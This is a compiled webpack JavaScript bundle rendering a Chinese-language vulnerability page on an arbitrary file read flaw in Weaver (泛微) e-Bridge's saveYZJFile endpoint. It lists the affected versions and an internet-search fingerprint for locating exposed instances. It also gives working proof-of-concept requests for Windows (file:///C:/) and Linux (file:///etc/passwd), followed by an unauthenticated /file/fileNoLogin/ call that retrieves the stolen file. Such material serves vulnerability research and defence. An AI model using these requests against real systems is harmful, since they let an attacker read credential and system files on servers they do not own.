(window.webpackJsonp=window.webpackJsonp||[]).push([[100],{1528:function(e,s,t){e.exports=t.p+"assets/img/fanwei-1.a06f4932.png"},1529:function(e,s,t){e.exports=t.p+"assets/img/fanwei-2.128e1c40.png"},1530:function(e,s,t){e.exports=t.p+"assets/img/fanwei-3.3b1c9341.png"},1531:function(e,s,t){e.exports=t.p+"assets/img/fanwei-4.17ec7149.png"},2599:function(e,s,t){"use strict";t.r(s);var a=t(75),i=Object(a.a)({},(function(){var e=this,s=e.$createElement,a=e._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[a("h1",{attrs:{id:"泛微oa-e-bridge-saveyzjfile-任意文件读取漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#泛微oa-e-bridge-saveyzjfile-任意文件读取漏洞"}},[e._v("#")]),e._v(" 泛微OA E-Bridge saveYZJFile 任意文件读取漏洞")]),e._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[e._v("#")]),e._v(" 漏洞描述")]),e._v(" "),a("p",[e._v("泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。")]),e._v(" "),a("h2",{attrs:{id:"影响版本"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[e._v("#")]),e._v(" 影响版本")]),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v("泛微云桥 e-Bridge 2018-2019 多个版本")]),a("br"),e._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[e._v("#")]),e._v(" 网络测绘")]),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v('title="泛微云桥e-Bridge"')]),a("br"),e._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[e._v("#")]),e._v(" 漏洞复现")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("# Windows验证POC\n\n/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br"),a("span",{staticClass:"line-number"},[e._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1528),alt:"img"}})]),e._v(" "),a("p",[e._v("成功返回 "),a("code",[e._v("id值")]),e._v(",说明含有此漏洞")]),e._v(" "),a("a-alert",{attrs:{type:"success",message:"调用查看文件接口访问 /file/fileNoLogin/id值",description:"",showIcon:""}}),e._v(" "),a("br"),e._v(" "),a("p",[a("img",{attrs:{src:t(1529),alt:"img"}})]),e._v(" "),a("h3",{attrs:{id:""}},[a("a",{staticClass:"header-anchor",attrs:{href:"#"}},[e._v("#")])]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("# Linux验证POC\n\n/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br"),a("span",{staticClass:"line-number"},[e._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1530),alt:"img"}})]),e._v(" "),a("p",[e._v("成功返回 "),a("code",[e._v("id值")]),e._v(",说明含有此漏洞")]),e._v(" "),a("p",[e._v("调用查看文件接口访问 "),a("code",[e._v("/file/fileNoLogin/id值")])]),e._v(" "),a("p",[a("img",{attrs:{src:t(1531),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=i.exports}}]);